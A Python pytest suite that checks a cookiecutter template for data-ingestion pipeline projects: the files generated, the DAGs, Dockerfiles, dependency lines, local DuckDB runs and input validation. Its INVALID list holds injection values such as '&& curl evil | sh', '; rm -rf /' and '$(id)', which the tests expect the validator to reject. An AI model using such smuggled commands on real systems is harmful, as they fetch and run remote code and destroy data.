"""Geração do template `template-pipeline` (tipo `ingestao`) e checagem dos projetos gerados."""

from __future__ import annotations

import ast
import subprocess
import sys
from collections.abc import Callable
from pathlib import Path

import dataeng_core
import duckdb
import pytest
from cookiecutter.exceptions import FailedHookException
from dataeng_core import cli

Bake = Callable[..., Path]
VERSION = dataeng_core.__version__
MINOR = ".".join(VERSION.split(".")[:2])
GIT_URL = "https://github.com/Talambert/tanc-portifolio.git"


def _rel(root: Path) -> set[str]:
    return {p.relative_to(root).as_posix() for p in root.rglob("*") if p.is_file()}


def _validate_and_plan(root: Path, config: str = "config/pipeline.yaml") -> None:
    for command in ("validate-config", "plan"):
        argv = [command, "--config", str(root / config), "--ambiente", "local"]
        assert cli.main(argv) == 0, f"{command} falhou em {root / config}"


def _build_dag_call(path: Path) -> ast.Call:
    calls = [
        n
        for n in ast.walk(ast.parse(path.read_text(encoding="utf-8")))
        if isinstance(n, ast.Call) and getattr(n.func, "id", None) == "build_dag"
    ]
    assert len(calls) == 1
    return calls[0]


def _kw(call: ast.Call, name: str) -> object:
    for kw in call.keywords:
        if kw.arg == name:
            return ast.literal_eval(kw.value) if isinstance(kw.value, ast.Constant) else ast.unparse(kw.value)
    raise AssertionError(f"build_dag sem o argumento {name}")


def _run_project_tests(root: Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, "-m", "pytest", "-q", "-p", "no:cacheprovider", "tests"],
        cwd=root,
        check=False,
        capture_output=True,
        text=True,
        timeout=240,
    )


def test_ingestao_arquivo_cloud_run_generates_expected_files(bake: Bake) -> None:
    root = bake(origens="arquivo", motor_ingestao="cloud_run", modo_carga="append")
    assert _rel(root) == {
        ".dockerignore",
        ".gitignore",
        "Dockerfile",
        "README.md",
        "pyproject.toml",
        "config/pipeline.yaml",
        "config/ambientes/local.yaml",
        "config/ambientes/dev.yaml",
        "config/ambientes/prod.yaml",
        "schemas/origem.yaml",
        "schemas/destino.yaml",
        "sql/ddl/silver_registros_arquivo.sql",
        "custom/__init__.py",
        "dags/pipeline.py",
        "data/amostra.csv",
        "tests/test_config.py",
        "tests/test_local_run.py",
    }
    assert len((root / "data/amostra.csv").read_text(encoding="utf-8").splitlines()) == 6  # cabeçalho + 5
    yaml_text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert "nome: meu-pipeline" in yaml_text
    assert "${bucket_bronze}" in yaml_text and "${dataset_silver}" in yaml_text  # ${} intactos
    assert "{{" not in yaml_text and "{%" not in yaml_text
    ddl = (root / "sql/ddl/silver_registros_arquivo.sql").read_text(encoding="utf-8")
    assert "${dataset_silver}.registros_arquivo" in ddl


@pytest.mark.parametrize("motor", ["cloud_run", "dataproc"])
def test_unwanted_blocks_are_removed(bake: Bake, motor: str) -> None:
    root = bake(origens="arquivo", motor_ingestao=motor)
    files = _rel(root)
    assert not any(f.startswith(("sql/views", "spark")) for f in files)
    assert not (root / "sql/views").exists() and not (root / "spark").exists()
    assert {f for f in files if f.startswith("dags/")} == {"dags/pipeline.py"}
    assert not any(f.startswith("config/pipeline_") for f in files)
    assert f"motor: {motor}" in (root / "config/pipeline.yaml").read_text(encoding="utf-8")


def test_api_origin_removes_file_blocks_and_local_run_test(bake: Bake) -> None:
    api = bake(origens="api")
    files = _rel(api)
    assert "data/amostra.csv" not in files and "schemas/origem.yaml" not in files
    assert "tests/test_local_run.py" not in files  # R3: origem api não roda local (sem rede)
    assert "tests/test_config.py" in files
    assert "sql/ddl/silver_registros_api.sql" in files
    assert "sql/ddl/silver_registros_arquivo.sql" not in files
    text = (api / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert "registros_api" in text and "registros_arquivo" not in text
    both = bake(origens="arquivo,api", nome_projeto="duas-origens")
    both_files = _rel(both)
    assert {"data/amostra.csv", "schemas/origem.yaml", "sql/ddl/silver_registros_api.sql"} <= both_files
    assert "tests/test_local_run.py" not in both_files  # a origem api faria rede


def test_motor_ambos_generates_two_dags_and_two_configs(bake: Bake) -> None:
    root = bake(origens="arquivo", motor_ingestao="ambos")
    assert {f for f in _rel(root) if f.startswith(("dags/", "config/pipeline"))} == {
        "dags/pipeline_cloud_run.py",
        "dags/pipeline_dataproc.py",
        "config/pipeline.yaml",
        "config/pipeline_dataproc.yaml",
    }
    assert "motor: cloud_run" in (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    dataproc = (root / "config/pipeline_dataproc.yaml").read_text(encoding="utf-8")
    assert "motor: dataproc" in dataproc and "motor: cloud_run" not in dataproc
    for engine, config in (("cloud_run", "pipeline.yaml"), ("dataproc", "pipeline_dataproc.yaml")):
        path = root / f"dags/pipeline_{engine}.py"
        call = _build_dag_call(path)
        assert _kw(call, "dag_id") == f"meu-pipeline_{engine}"
        assert _kw(call, "job_config_path") == f"config/{config}"
        assert f'"{config}"' in path.read_text(encoding="utf-8")
    _validate_and_plan(root)
    _validate_and_plan(root, "config/pipeline_dataproc.yaml")


def test_dag_passes_config_path_and_job_config_path(bake: Bake) -> None:
    root = bake(origens="arquivo")
    text = (root / "dags/pipeline.py").read_text(encoding="utf-8")
    assert "from dataeng_core.airflow.dag import build_dag" in text
    assert "import airflow" not in text and "from airflow" not in text
    call = _build_dag_call(root / "dags/pipeline.py")
    assert [ast.unparse(a) for a in call.args] == ["str(CONFIG_PATH)"]
    assert _kw(call, "job_config_path") == "config/pipeline.yaml"
    assert "__file__" in text and "dag_id" not in text  # motor único: dag_id padrão da biblioteca
    assert "ts_nodash" not in text


def test_generated_project_validates_and_plans(bake: Bake) -> None:
    root = bake(origens="arquivo,api", motor_ingestao="cloud_run", modo_carga="merge")
    _validate_and_plan(root)


def test_generated_project_runs_local_and_is_idempotent(bake: Bake) -> None:
    root = bake(origens="arquivo")
    config = str(root / "config/pipeline.yaml")
    run = ["run", "local", "--config", config, "--run-id", "20260301T060000-aaaaaa"]
    assert cli.main(run) == 0
    assert cli.main(run) == 0
    db = next((root / ".local").rglob("*.duckdb"))
    con = duckdb.connect(str(db), read_only=True)
    try:
        rows = con.execute("SELECT id, nome, valor FROM silver.registros_arquivo ORDER BY id").fetchall()
    finally:
        con.close()
    assert [r[0] for r in rows] == [1, 2, 3, 4, 5]
    assert rows[0][1] == "Alfa"


def test_generated_project_own_tests_pass(bake: Bake) -> None:
    root = bake(origens="arquivo")
    proc = _run_project_tests(root)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "passed" in proc.stdout


def test_generated_api_project_own_tests_pass(bake: Bake) -> None:
    root = bake(origens="api", motor_ingestao="dataproc")
    proc = _run_project_tests(root)
    assert proc.returncode == 0, proc.stdout + proc.stderr


def test_origem_da_biblioteca_changes_the_dependency_line(bake: Bake) -> None:
    git = bake(origem_da_biblioteca="git")
    text = (git / "pyproject.toml").read_text(encoding="utf-8")
    assert f'"dataeng-core[local] @ git+{GIT_URL}@dataeng-core-v{VERSION}#subdirectory=lib-dataeng-core"' in text
    assert "extra-index-url" not in text
    custom = bake(origem_da_biblioteca="git", repositorio_biblioteca="https://example.org/org/repo.git")
    custom_text = (custom / "pyproject.toml").read_text(encoding="utf-8")
    assert "git+https://example.org/org/repo.git@dataeng-core-v" in custom_text
    registry = bake(origem_da_biblioteca="artifact_registry", indice_artifact_registry="https://idx.example/simple/")
    text = (registry / "pyproject.toml").read_text(encoding="utf-8")
    assert f'"dataeng-core[local]=={MINOR}.*"' in text
    assert "git+" not in text
    reqs = (registry / "requirements.txt").read_text(encoding="utf-8").splitlines()
    assert "--extra-index-url https://idx.example/simple/" in reqs
    assert f"dataeng-core[local]=={MINOR}.*" in reqs
    assert not (git / "requirements.txt").exists()


def test_dockerfile_installs_pinned_library_and_sets_entrypoint(bake: Bake) -> None:
    entry = 'ENTRYPOINT ["python", "-m", "dataeng_core.jobs.run_step"]'
    git = (bake(origem_da_biblioteca="git") / "Dockerfile").read_text(encoding="utf-8").splitlines()
    assert entry in git
    install = [line for line in git if "dataeng-core" in line and "pip install" in line]
    assert len(install) == 1
    assert f'"dataeng-core[gcp] @ git+{GIT_URL}@dataeng-core-v{VERSION}#subdirectory=lib-dataeng-core"' in install[0]
    assert any("apt-get install" in line and "git" in line for line in git)
    assert any(line.startswith("USER ") and "root" not in line for line in git)
    registry = bake(origem_da_biblioteca="artifact_registry", indice_artifact_registry="https://idx.example/simple/")
    lines = (registry / "Dockerfile").read_text(encoding="utf-8").splitlines()
    assert entry in lines
    install = [line for line in lines if "dataeng-core" in line and "pip install" in line]
    assert len(install) == 1
    assert "--extra-index-url https://idx.example/simple/" in install[0]
    assert f'"dataeng-core[gcp]=={MINOR}.*"' in install[0]
    assert not any("apt-get" in line for line in lines)
    assert "COPY config/ config/" in lines and "WORKDIR /app" in lines


def test_environments_use_fictitious_values_and_api_uses_secret_env_name(bake: Bake) -> None:
    root = bake(origens="arquivo,api")
    envs = {n: (root / f"config/ambientes/{n}.yaml").read_text(encoding="utf-8") for n in ("local", "dev", "prod")}
    assert "projeto_gcp: meu-projeto-dev" in envs["dev"] and "projeto_gcp: meu-projeto-prod" in envs["prod"]
    assert "modo: local" in envs["local"] and "modo: gcp" in envs["dev"]
    yaml_text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert "segredo_env: API_TOKEN" in yaml_text


@pytest.mark.parametrize("origem", ["arquivo", "api", "pubsub", "arquivo,pubsub"])
@pytest.mark.parametrize("motor", ["cloud_run", "dataproc", "ambos"])
@pytest.mark.parametrize("modo", ["append", "overwrite_particao", "merge"])
def test_matrix_origem_motor_modo_carga(bake: Bake, origem: str, motor: str, modo: str) -> None:
    root = bake(origens=origem, motor_ingestao=motor, modo_carga=modo)
    _validate_and_plan(root)
    if motor == "ambos":
        _validate_and_plan(root, "config/pipeline_dataproc.yaml")
    text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    origens = origem.split(",")
    if origens != ["pubsub"]:
        assert f"modo_carga: {modo}" in text
    assert ("chaves_merge: [id]" in text) == (modo == "merge" and origens != ["pubsub"])
    if "pubsub" in origens:
        # pubsub não aceita overwrite_particao: append (merge por message_id) ou merge por message_id
        assert "tipo: pubsub" in text and "dedupe_por: message_id" in text
        assert ("chaves_merge: [message_id]" in text) == (modo == "merge")
        assert ("modo_carga: merge" if modo == "merge" else "modo_carga: append") in text


def test_pubsub_origin_generates_its_blocks_and_local_run_test(bake: Bake) -> None:
    root = bake(origens="pubsub")
    files = _rel(root)
    assert {"schemas/origem_eventos.yaml", "schemas/destino_eventos.yaml", "sql/ddl/silver_eventos.sql"} <= files
    assert "data/amostra.csv" not in files and "schemas/origem.yaml" not in files
    assert "sql/ddl/silver_registros_arquivo.sql" not in files and "sql/ddl/silver_registros_api.sql" not in files
    assert "tests/test_local_run.py" in files  # pubsub roda local com o LocalPubSub
    text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert 'assinatura: "projects/${projeto_gcp}/subscriptions/eventos-sub"' in text
    assert "registros_arquivo" not in text and "registros_api" not in text
    assert "message_id" in (root / "schemas/destino_eventos.yaml").read_text(encoding="utf-8")
    both = _rel(bake(origens="arquivo,pubsub", nome_projeto="arquivo-e-eventos"))
    assert {"data/amostra.csv", "schemas/origem.yaml", "schemas/destino_eventos.yaml", "tests/test_local_run.py"} <= both
    without = _rel(bake(origens="arquivo", nome_projeto="sem-eventos"))
    assert not any("eventos" in f for f in without)
    with_api = _rel(bake(origens="api,pubsub", nome_projeto="api-e-eventos"))
    assert "tests/test_local_run.py" not in with_api  # a origem api faria rede


def test_generated_pubsub_project_runs_local_with_empty_queue(bake: Bake) -> None:
    root = bake(origens="pubsub")
    run = ["run", "local", "--config", str(root / "config/pipeline.yaml"), "--run-id", "20260301T060000-aaaaaa"]
    assert cli.main(run) == 0  # fila local vazia: ok com 0 linhas (limitação documentada no README)
    db = next((root / ".local").rglob("*.duckdb"))
    con = duckdb.connect(str(db), read_only=True)
    try:
        control = con.execute("SELECT etapa, status, linhas_lidas, backlog FROM silver._controle_execucoes").fetchall()
    finally:
        con.close()
    assert control == [("ingere_eventos", "ok", 0, 0)]


@pytest.mark.parametrize("origens", ["pubsub", "arquivo,pubsub"])
def test_generated_pubsub_project_own_tests_pass(bake: Bake, origens: str) -> None:
    root = bake(origens=origens, modo_carga="merge")
    proc = _run_project_tests(root)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    # 4 de configuração (configs, validate-config, plan, DAG) + run local + ingestão com o LocalPubSub
    assert "6 passed" in proc.stdout, proc.stdout
    assert "skipped" not in proc.stdout


INVALID = [
    ("origens", "pubsub,kafka", "desconhecida"),
    ("origens", "", "origens"),
    ("origens", "arquivo,arquivo", "repetidas"),
    ("origens", 'arq"uivo', "desconhecida"),
    ("origens", "arq" + chr(92) + "uivo\nx", "desconhecida"),
    ("nome_projeto", "nome inválido!", "formato esperado"),
    ("agenda_cron", '0 6 * * 1" \n  injected: x', "formato esperado"),
    ("agenda_cron", "0 6 * *", "formato esperado"),
    ("agenda_cron", "@whenever", "formato esperado"),
    ("projeto_gcp", "a: b\nfoo: bar", "formato esperado"),
    ("projeto_gcp", "Meu_Projeto", "formato esperado"),
    ("regiao", "sao paulo", "formato esperado"),
    ("bucket_bronze", 'x"y', "formato esperado"),
    ("bucket_bronze", "AB", "formato esperado"),
    ("dataset_silver", "my-silver", "formato esperado"),
    ("dataset_gold", "1gold", "formato esperado"),
    ("versao_biblioteca", "abc", "formato esperado"),
    ("versao_biblioteca", "1", "formato esperado"),
    ("repositorio_biblioteca", 'https://x" && curl evil | sh #', "formato esperado"),
    ("repositorio_biblioteca", "http://github.com/o/r.git", "formato esperado"),
    ("indice_artifact_registry", "https://x/simple/; rm -rf /", "formato esperado"),
    ("indice_artifact_registry", "https://x/$(id)", "formato esperado"),
]


@pytest.mark.parametrize(("variavel", "valor", "trecho"), INVALID)
def test_invalid_answers_fail_in_pre_gen_naming_the_variable(
    bake: Bake, capfd: pytest.CaptureFixture[str], variavel: str, valor: str, trecho: str
) -> None:
    with pytest.raises(FailedHookException):
        bake(**{variavel: valor})
    err = capfd.readouterr().err
    assert "ERRO ao gerar o projeto" in err
    assert variavel in err and trecho in err
    assert "SyntaxError" not in err and "Traceback" not in err


def test_valid_alternative_answers_are_accepted(bake: Bake) -> None:
    root = bake(agenda_cron="@daily", regiao="us-central1", dataset_silver="_silver2", versao_biblioteca="1.12.3")
    assert 'agenda: "@daily"' in (root / "config/pipeline.yaml").read_text(encoding="utf-8")


@pytest.mark.parametrize(
    ("variavel", "valor"),
    [("tipo_projeto", "relatorio"), ("motor_ingestao", "spark"), ("modo_carga", "upsert"), ("origem_da_biblioteca", "pip")],
)
def test_choice_variables_reject_unknown_values(bake: Bake, variavel: str, valor: str) -> None:
    """Variáveis de escolha são recusadas pelo próprio Cookiecutter, antes de qualquer arquivo ser gerado."""
    with pytest.raises(ValueError, match=variavel):
        bake(**{variavel: valor})
